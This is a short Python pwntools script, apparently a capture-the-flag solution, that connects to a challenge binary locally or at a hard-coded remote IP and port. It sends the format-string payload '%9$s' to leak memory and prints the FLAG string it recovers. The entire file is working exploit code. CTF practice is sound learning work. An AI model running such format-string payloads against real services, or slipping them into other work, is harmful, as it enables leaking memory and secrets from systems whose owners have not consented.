#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote("18.188.231.247", 2004)


def main():
    r = conn()

    # good luck pwning :)
    r.sendline("%9$s")
    print(re.search("(FLAG{.*})",r.recvall().decode('ascii')).group(1))



if __name__ == "__main__":
    main()
